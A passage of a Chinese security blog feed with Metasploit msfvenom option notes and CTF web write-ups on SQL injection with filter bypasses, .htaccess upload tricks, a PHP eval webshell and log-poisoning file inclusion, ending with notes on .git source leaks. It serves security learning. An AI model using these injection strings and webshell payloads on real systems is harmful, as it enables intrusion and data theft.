title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom是生成后门的工具</p><h3 id="常用参数-2"><a href="#常用参数-2" class="headerlink" title="常用参数"></a>常用参数</h3><blockquote><p>Options:<br>-l, –list            <type>        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等<br>-p, –payload         <payload>     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取<br> –list-options                  # 列出–payload <value> 的标准，高级和规避选项<br>-f, –format          <format>      # 指定 Payload 的输出格式(使用 –list formats 列出)<br>-e, –encoder         <encoder>     # 指定使用的 Encoder (使用 –list encoders 列出)<br> –sec-name        <value>       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串<br> –smallest                      # 使用所有可用的编码器生成最小的payload<br> –encrypt         <value>       # 应用于shellcode的加密或编码类型 (使用–list encrypt 列出)<br> –encrypt-key     <value>       # 用于加密的密钥<br> –encrypt-iv      <value>       # 加密的初始化向量<br>-a, –arch            <arch>        # 指定目标系统架构(使用 –list archs  列出)<br> –platform        <platform>    # 指定目标系统平台 (使用 –list platforms 列出)<br>-o, –out             <path>        # 保存payload文件<br>-b, –bad-chars       <list>        # 设置需要在 Payload 中避免出现的字符，如： ‘\x00\xff’<br>-n, –nopsled         <length>      # 指定 nop 在 payload 中的数量<br>-s, –space           <length>      # 设置未经编码的 Payload 的最大长度<br> –encoder-space   <length>      # 编码后的 Payload 的最大长度<br>-i, –iterations      <count>       # 设置 Payload 的编码次数<br>-c, –add-code        <path>        # 指定包含一个额外的win32 shellcode文件<br>-x, –template        <path>        # 指定一个特定的可执行文件作为模板<br>-k, –keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行<br>-v, –var-name        <value>       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）<br>-t, –timeout         <second>      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）<br>-h, –help                          # 帮助</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/600607290">Msfvenom介绍及使用</a></p><h2 id="Msfconle"><a href="#Msfconle" class="headerlink" title="Msfconle"></a>Msfconle</h2><h3 id="常用参数-3"><a href="#常用参数-3" class="headerlink" title="常用参数"></a>常用参数</h3><blockquote><p>-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</p><p>-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</p><p>-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</p><p>-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</p><p>-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</p><p>-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64</p><p>–platform &lt; platform&gt; 指定payload的目标平台</p><p>-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</p><p>-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 ‘\x0f’、’\x00’;</p><p>-i, –iterations &lt; count&gt; 指定payload的编码次数</p><p>-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</p><p>-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</p><p>-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</p><p>–payload-options 列举payload的标准选项</p><p>-o, –out &lt; path&gt; 指定创建好的payload的存放位置</p><p>-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</p><p>–shellest 最小化生成payload</p><p>-h, –help 查看帮助选项</p><p>–help-formats 查看msf支持的输出格式列表</p></blockquote><p><a href="https://blog.csdn.net/zx77588023/article/details/119063685">Msfconsole介绍及使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buff的Web</title>
      <link href="/2023/06/04/Buff/"/>
      <url>/2023/06/04/Buff/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Include1"><a href="#ACTF2020-新生赛-Include1" class="headerlink" title="[ACTF2020 新生赛]Include1"></a>[ACTF2020 新生赛]Include1</h2><p>考点：文件包含</p><blockquote><p>查看了源码和数据包，发现没有想要的信息，又爆破的一波目录，并没有有用目录，几乎都指向index.php，突然灵光一闪，想着会不会是无法显示的信息，然后用PHP伪协议进行base64编码，发现了一串编码，然后解码获取flag。</p></blockquote><p>使用是伪协议：?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p><blockquote><p>filter：滤器</p><p>该协议的作用：作为一个中间流来处理其他流，可以进行任意文件的读取(获取页面源码)</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/540864302">伪协议了解</a></p><h2 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h2><p>考点：sql注入</p><p>操作过程：</p><blockquote><p>发现输入1，2都正常，然后输入3以上就没有结果了。然后尝试输入单引号，发现报错，于是猜测这是单引号闭合，尝试使用1’ or ‘1’&#x3D; ‘1 –+，发现正常，确认是单引号闭合。使用1’ order by 1,2,3 –+发现错误，即最多回显2个字段信息。使用0’ select databse(),2 –+发现select等等一些关键字被禁用<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309071036414.png"></p><p>select被禁用导致了很多的方法都无法使用了，其中包括了联合、布尔注入和时间盲注。尝试堆叠注入。</p><blockquote><p>堆叠注入的原理是因为mysql支持多个语句一起执行，不过需要用” ; “分隔开</p></blockquote><p>查看mysql的命令，执行查看数据库的命令：1’;show databases ; –+，发现可行，返回数据库信息。然后发现了”ctftraining“的数据库，然后执行1’;use ctftraining;show tables–+，发现了”FLAG_TABLE“字段，使用1’;use ctftraining;show columns from FLAG_TABLE–+发现提示not_flag，flag不在这里，直接执行1’;show tables –+查看所有表，发现了两个表<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309071122904.png"></p><p>然后查看其中的字段，查看第一个表1’; show columns from `1919810931114514` –+,终于发现了flag。然后就做不下去了，因为select被禁用，想过用sel&lt;&gt;ect绕过，但是发现不行，最后没有想法看<a href="https://blog.csdn.net/qq_44657899/article/details/103239145?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-103239145-blog-123292860.235%5Ev38%5Epc_relevant_sort_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-103239145-blog-123292860.235%5Ev38%5Epc_relevant_sort_base3&utm_relevant_index=1">wp</a></p><blockquote><p>wp1：使用prepare ..from 和excute 进行16进制编码绕过</p><p>select `flag` from   `1919810931114514` 的十六进制：0x73656C6563742060666C6167602066726F6D20603139313938313039333131313435313460</p><p>payload：1’;Set @a&#x3D;0x73656C6563742060666C6167602066726F6D20603139313938313039333131313435313460;prepare exesql from @a;execute exesql –+</p><p>&#x2F;&#x2F;发现set和prepare同时使用会被检测，于是变换set为Set等等</p><p><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">mysql预处理</a></p><p><a href="https://blog.csdn.net/lqx_sunhan/article/details/79852063#2.%E8%BF%99%E4%B8%AA%E8%AF%AD%E6%B3%95%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84">prepare语句</a></p></blockquote><blockquote><p>wp2：使用handler 语句（mysql特殊语句）</p><p>payload：1’;handler `1919810931114514`  open;handler `1919810931114514` read next –+</p><p>&#x2F;&#x2F;打开数据表，然后按索引读表中的字段内容</p><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">handler 姿势</a></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官网介绍</a></p></blockquote></blockquote><p><a href="https://blog.csdn.net/weixin_44870139/article/details/105555238">mysql操作命令</a></p><p><a href="https://zhuanlan.zhihu.com/p/606363356">mysql查看版本信息</a></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>考点: sql注入</p><blockquote><p>尝试输入1,2,3都可以返回数字,输入单引号后没有内容输出,而使用双引号发现返回nonono;以为是双引号闭合,但是验证闭合的结果和输入双引号一样,无法确定.再次输入一些关键字,发现结果和输入双引号一样的内容输出nonono.例如:from、handler….，但是可以使用分号，于是尝试了一下堆叠 注入，输入了1;show databases –+和1;show databases都没有有效输出，然后修改注释符号1;show databases#发现返回有效内容，查看表1;show tables#发现了Flag；可是剩下弄了一波没有办法操作了. 看了wp ,造成输入数字和字母区别的问题在于sql语句的原型是</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">></span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">.</span>$post<span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"||flag from Flag"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就是对输入的参数过滤后然后进行连接,其中||是或操作,即select [咩咩] || flag from Flag,如果咩咩是数字则进行或操作,可以得到1或者0的结果映射出来,而如果是字母则无法映射结果,无输出.再测试发现&amp;&amp;也可以这样的</p></blockquote><blockquote><p>wp1:使用逗号进行分割</p><p>payload: *,1&#x2F;&#x2F;即select *, 1 || flag from Flag ,将 * 和1|| flag作为两个字段名称,所以可以直接输出Flag的全部信息</p></blockquote><blockquote><p>wp2:将||修改成为连接符（对&amp;&amp;无效）</p><p>payload: 1;set sql_mode&#x3D;pipes_as_concat;select 1&#x2F;&#x2F;即select 1;set sql_mode&#x3D;pipes_as_concat;select 1 || flag from Flag；（1||flag会将1和flag的内容连接）</p><p><a href="https://www.cnblogs.com/clschao/articles/9962347.html">sql_mode</a></p><p><a href="https://blog.csdn.net/lixora/article/details/60572357">mysql 修改sql_mode 实现字符串管道‘||’连接</a></p></blockquote><h2 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h2><p>考点: sql注入</p><p>输入账号密码，然后使用hackbar测试。测试内容是对账号的添加单引号，双引号，变形括号，当输入单引号的时候便发现了报错，再验证信息username&#x3D;1’ or ‘1’&#x3D;’1–+&amp;password&#x3D;1，发现正常返回，于是确定是单引号闭合。</p><p>使用order by语句测试可返回字段<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101229933.png"></p><p>发现过滤了<strong>or和by</strong>，使用双写绕过?username&#x3D;0’ oorrder bbyy 1,2,3,4 –+&amp;password&#x3D;1</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101230114.png"></p><p>发现了只能返回3个字段，于是查看哪些是显位?username&#x3D;0’union select 1,2,3 –+&amp;password&#x3D;1</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101318776.png"></p><p>发现过滤了<strong>union和select</strong>，于是继续绕过?username&#x3D;0’ununionion seselectlect 1,2,3 –+&amp;password&#x3D;1</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101234428.png"></p><p>查看数据库?username&#x3D;0’ununionion seselectlect 1,database(),3 –+&amp;password&#x3D;1</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101235567.png"></p><p>查看表名，发现过滤了where和from</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101239835.png"></p><p>继续绕?username&#x3D;0’ununionion seselectlect 1,(seselectlect  group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema &#x3D; database()),3 –+&amp;password&#x3D;1</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101240096.png"></p><p>查看b4bsql：?username&#x3D;0’ununionion seselectlect 1,(seselectlect  group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name &#x3D; ‘b4bsql’),3 –+&amp;password&#x3D;1</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101242476.png"></p><p>查看字段username和password：?username&#x3D;0’ununionion seselectlect 1,(selselectect group_concat(username,0x26,passwoorrd) frfromom b4bsql),3–+&amp;password&#x3D;1</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309101257275.png"></p><p>上面的password也需要双写or成passwoorrd，最后获得flag：flag{8326e006-a228-457d-bd23-e7efa2403d76}</p><blockquote><p>双写绕过：</p><p>模型大概使用preg_replace()或者str_replace()将特定的字符替换成空，然后导致无法输入原来的内容。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"from"</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">echo</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"from"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将$sql中的from替换成空</span><span class="token operator">></span><span class="token comment">//输出结果是:空</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用双写绕过大概的方法就是重复写多一次想要输入内容在中间，让函数替换成空最后连接成为原来想要输入的内容</p><p>比如：</p><ul><li>select     通过双写绕过就是 sel<strong>select</strong>ect，可以看到标黑部分就是想要输入的，然后被替换成空后得到select</li><li>from      通过双写绕过就是fr<strong>from</strong>om，将其中的一个from替换成空后还是from</li></ul><p>其他的也一样，只不过需要在测试的时候看看是哪些字符被替换成空了</p></blockquote><h2 id="MRCTF2020-你传你🐎呢-1"><a href="#MRCTF2020-你传你🐎呢-1" class="headerlink" title="[MRCTF2020]你传你🐎呢 1"></a>[MRCTF2020]你传你🐎呢 1</h2><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111120202.png"></p><p>上传的文件内容是&lt;?php @eval($_POST[‘cmd’]); ?&gt;，发现<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111122495.png">，估计是被过滤了php，然后认为是后缀名有问题，就爆破了php可执行的文件后缀，可是发现没有一个可以通过的。然后我尝试了禁用js，看看是否是js导致过滤了这些内容，禁用后发现并没有效果，但是可以上传jpg类型的文件即Content-Type为image&#x2F;jpeg（发现image&#x2F;png也可，但是文件内容太大都不行）<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111204989.png">然后新手表示没办法了。看了wp后学习到了新知识。使用的是.htaccess解析漏洞，就是将携带webshell的图片修改为php可执行文件</p><blockquote><p>.htaccess文件内容：</p><pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&gt;&lt;FilesMatch &quot;1.jpg&quot;&gt;&gt;Sethandler application&#x2F;x-httpd-php&gt;&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;&gt;&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>webshell：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>先上传.htaccess文件（需要修改Content-Type类型），目的是修改目录及子目录的配置，然后再上传带有webshell的1.jpg，最后用蚁剑连接获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309111242930.png"></p><blockquote><p>MIME类型就是服务端会检测Content-Type的值</p><p>常见的MIME类型有：image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif</p></blockquote><p><a href="https://blog.csdn.net/qq_42368885/article/details/103182896">文件上传之MIME类型绕过</a></p><blockquote><p>.htaccess文件是<strong>Apache服务器</strong>下的一个配置文件,在本题大概<a href="https://www.cnblogs.com/engeng/articles/5948089.html">作用</a>就是<strong>将标记文件映射为php可执行文件</strong>，作用域为其所在目录与其所有的子目录,若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果</p><p>写法：</p><ul><li>Sethandler 指令：<br> 将该目录及子目录的所有文件均映射为php文件类型</li><li>Addhandler 指令：<br> 使用 php5-script 处理器来解析所匹配到的文件</li><li>AddType 指令<br> 将特定扩展名文件映射为php文件类型</li></ul></blockquote><p><strong>burp suite重新发送文件会覆盖原来命名的文件</strong></p><p><a href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess介绍</a></p><p><a href="https://www.cnblogs.com/linuxsec/articles/12078206.html">一句话木马变形</a></p><h2 id="羊城杯2020-easyphp-1"><a href="#羊城杯2020-easyphp-1" class="headerlink" title="[羊城杯2020]easyphp 1"></a>[羊城杯2020]easyphp 1</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码如上，发现它会用<a href="https://www.runoob.com/php/func-filesystem-unlink.html">unlink</a>删除了当前目录下除了index.php以外的文件，一开始我以为没有啥影响，就照做下去了，可是后来才发现这是卡住自己的地方。这道题对于传入的content用<a href="https://www.runoob.com/php/func-string-strstr.html">stristr</a>对传入的文件进行了截取。然后对传入的filename进行了过滤，即无法传入除了小写字母和” . “构成外的参数。经过之前的毒打，理解了<a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">file_put_contents</a>是将第二个参数写入第一个参数的文件中，我就构造了payload：?content&#x3D;&lt;?php system(“ls”);?&gt;&amp;filename&#x3D;flag.php，当我访问了flag.php后发现</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309121705908.png"></p><p>这个文件没有进行PHP解析，无法执行，<strong>也许</strong>因为前面删除文件的作用，删除了.htaccess文件吧，只能继续学知识了。</p><blockquote><p>处理方法：重新写入.htaccess关于解析php代码的内容(让所有的 PHP 文件【index.php】都包含 .htaccess 文件自身,在.htaccess后面写入PHP代码执行)</p><p>​先了解<code>.htaccess</code> 中使用<code>#</code> 进行单行注释，php_value auto_append_file会自动包含并解析文件</p><p>​最后就是利用.htaccess写shell，将一句话写入到.htaccess的注释中，再利用它自动加载文件的特性加载.htaccess文件，从而加载一句话。如：在<code>.htaccess</code> 中使用<code>php_value auto_prepend_file .htaccess#&lt;?php system(&quot;ls&quot;);?&gt;</code> 在脚本头部加载一句话（剩下还需要绕过file和添加\转义content后\n的\）</p><p>所以payload：</p><p>查看：?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil%0ae%20.htaccess%0a%23<?php%20system("ls /");?>\&#x2F;&#x2F;发现flag，后面就可以绕过flag字符获取flag了</p><p>获取：?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil%0ae%20.htaccess%0a%23<?php%20system("cat /fla''g");?>\</p></blockquote><p>可是最后还是不懂为什么file中需要使用一个换行，试过删除则无用的payload</p><p><a href="https://cloud.tencent.com/developer/article/1824057">.htaccess的姿势</a></p>]]></content>
      
      
      <categories>
          
          <category> 题目集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Buff </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础</title>
      <link href="/2023/06/03/ctf_show-web/"/>
      <url>/2023/06/03/ctf_show-web/</url>
      
        <content type="html"><![CDATA[<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>考点：文件包含漏洞</p><blockquote><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流(常见于文件包含和结合file_get_contents)</p></blockquote><blockquote><p>php:&#x2F;&#x2F;input协议无法在content-type是multipart&#x2F;form-data的时候使用,php:&#x2F;&#x2F;input访问的还是原始数据,而经过表单post会经过一次url编码，常与file_get_contents结合使用。可以自定义post信息</p></blockquote><p><a href="https://www.freebuf.com/articles/web/362895.html">伪协议php:input命令执行的原理</a></p><p><a href="https://blog.csdn.net/qq_53142368/article/details/116594299">PHP伪协议</a></p><p><a href="https://zhuanlan.zhihu.com/p/540864302">伪协议了解</a></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>考点：文件包含漏洞</p><blockquote><p>思路：想要学web3一样使用伪协议，发现报错，估计过滤了，然后没有思路了，查看wp，发现可以用shell连接。</p></blockquote><blockquote><p>1.抓包发送到Repeater查看raw发现Server: nginx&#x2F;1.18.0 (Ubuntu)</p><p>2.尝试查看nignx的默认日志文件(&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log),发现访问日志存在，并且里面的值都是UA</p><p>3.通过UA向上传一句话代码<?php @eval($_POST['flag']);?></p><p>4.使用蚁剑进行连接，当前环境下URL为放置代码的位置，密码为POST的value即flag</p><p>5.查看文件管理发现flag.txt</p></blockquote><p><a href="https://www.cnblogs.com/linuxsec/articles/12078206.html">一句话木马原理和变形</a></p><p><a href="https://blog.csdn.net/BYZY1314/article/details/127792228">一句话木马的使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 题目集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf_show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源码泄露</title>
      <link href="/2023/06/01/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/2023/06/01/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<p>常见类型:</p><blockquote><p>.git源码泄露</p><p>.svn源码泄露</p><p>.hg 源码泄露</p></blockquote><h2 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title=".git源码泄露"></a>.git源码泄露</h2><p>Git源码泄露是指将敏感或保密的代码、文件或数据意外地或非授权地公开到公共的Git存储库中。初始化目录git init会生成.git文件,如果因此发布到服务器上可能被利用复原源码.</p><blockquote><p>简单检查: 网址&#x2F;.git</p></blockquote><blockquote><p>目录了解:</p><ul><li>hooks：存放一些sheel的地方。</li><li>info：存放仓库的信息</li><li>object：存放所有git对象的地方</li><li>refs：存放提交hash的地方</li><li>config：github的配置信息</li><li>description：仓库的描述信息，主要给gitweb等git托管系统使用</li><li>HEAD：映射到ref引用，能够找到下一次commit的前一次哈希值</li></ul></blockquote><blockquote><p>修复建议：删除.git目录或者修改中间件配置进行对.git隐藏文件夹的访问。</p></blockquote><p><a href="https://www.freebuf.com/articles/web/267597.html">git泄露原理了解</a></p><h2 id="svn源码泄露"><a href="#svn源码泄露" class="headerlink" title=".svn源码泄露"></a>.svn源码泄露</h2><p>SVN是一种版本控制系统，用于管理和跟踪项目中的源代码和文件。</p><blockquote><p>出现原因: 